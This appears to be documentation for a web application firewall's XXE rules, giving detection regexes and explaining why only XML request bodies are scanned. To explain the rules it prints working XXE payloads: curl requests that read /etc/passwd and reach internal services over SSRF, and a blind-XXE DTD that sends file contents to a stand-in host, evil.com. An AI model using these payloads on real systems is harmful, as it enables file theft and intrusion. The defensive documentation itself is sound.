# XXE Rules

The WAF applies 6 XXE rules. All are `critical` severity.

**Scanned sources:** Request body only, and only when the content type is XML or the body starts with XML preambles.

---

## What XXE is

XML External Entity (XXE) injection exploits XML parsers that process entity declarations. When a parser is configured to allow external entities, an attacker can cause the server to:

- Read arbitrary local files (`file:///etc/passwd`)
- Make outbound HTTP requests to internal services (SSRF via XML)
- Perform denial-of-service attacks (billion laughs / XML bomb)
- In some cases execute server-side code (via protocols like `expect://`)

XXE is in OWASP Top 10 (A05:2021).

---

## Why only XML bodies are scanned

XXE is only possible through the XML parsing layer. The WAF checks the `Content-Type` header for `xml` (matches `application/xml`, `text/xml`, `application/xhtml+xml`, etc.) and also inspects the body directly for `<?xml` or `<!DOCTYPE` preambles as a fallback.

If a request has no XML content type and no XML-looking body, the XXE stage is skipped entirely. This prevents false positives on non-XML data that happens to contain the word `DOCTYPE`.

---

## All 6 rules

| Rule ID | Pattern | Example payload | Description |
|---------|---------|-----------------|-------------|
| `xxe-external-entity` | `<!ENTITY \w+ SYSTEM` | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | SYSTEM entity declaration — reads a file at the specified URI |
| `xxe-parameter-entity` | `<!ENTITY %` | `<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">` | Parameter entity — used in blind XXE to exfiltrate data via out-of-band channel |
| `xxe-system-id` | `SYSTEM "` | `SYSTEM "file:///etc/passwd"` | SYSTEM identifier in any context — the URI that the parser will dereference |
| `xxe-public-id` | `PUBLIC "` | `PUBLIC "-//..." "http://evil.com/evil.dtd"` | PUBLIC identifier with a URI — parsers fetch the external DTD |
| `xxe-xinclude` | `<xi:include` | `<root xmlns:xi="..."><xi:include href="/etc/passwd" parse="text"/></root>` | XInclude directive — a separate XML feature that also causes external resource loading |
| `xxe-doctype-entity` | `<!DOCTYPE[^>]*[` | `<!DOCTYPE foo [<!ENTITY ...>]>` | DOCTYPE with inline entity subset — a prerequisite for most in-band XXE |

---

## Example payloads

**Basic file read:**
```bash
curl -X POST http://localhost:3000/upload \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<x>&xxe;</x>'
```

**SSRF via XXE — access internal service:**
```bash
curl -X POST http://localhost:3000/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY xxe SYSTEM "http://192.168.1.1/admin">
]>
<x>&xxe;</x>'
```

**XInclude — no DOCTYPE needed:**
```bash
curl -X POST http://localhost:3000/parse \
  -H "Content-Type: application/xml" \
  -d '<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="/etc/passwd" parse="text"/>
</root>'
```

---

## Blind XXE explanation

Blind XXE is used when the parser processes the entity but does not include its value in the response. The attacker exfiltrates data out-of-band via a DNS request or HTTP callback:

1. Attacker defines a parameter entity that loads an external DTD:
   ```xml
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>
   ```

2. `evil.dtd` contains:
   ```xml
   <!ENTITY % data SYSTEM "file:///etc/passwd">
   <!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://evil.com/?data=%data;'>">
   %oob;
   ```

3. When the XML is parsed, the server fetches `evil.dtd`, evaluates it, then sends the file contents to `evil.com`.

The `xxe-parameter-entity` rule blocks `<!ENTITY %` which is required to define parameter entities used in all blind XXE variants.

---

## rawBody requirement

XXE scanning operates on the raw body string. If the body parser converts XML to a JavaScript/PHP object before the WAF runs, the raw XML is no longer available and scanning is skipped (to avoid false positives from re-stringifying the object).

For accurate XXE detection in Node.js:

```js
// Expose raw body for WAF
app.use((req, res, next) => {
  let raw = '';
  req.on('data', (chunk) => raw += chunk);
  req.on('end', () => { req.rawBody = raw; next(); });
});

// Then parse XML
app.use(express.text({ type: 'application/xml' }));

// Then mount WAF
app.use(...createWAF());
```
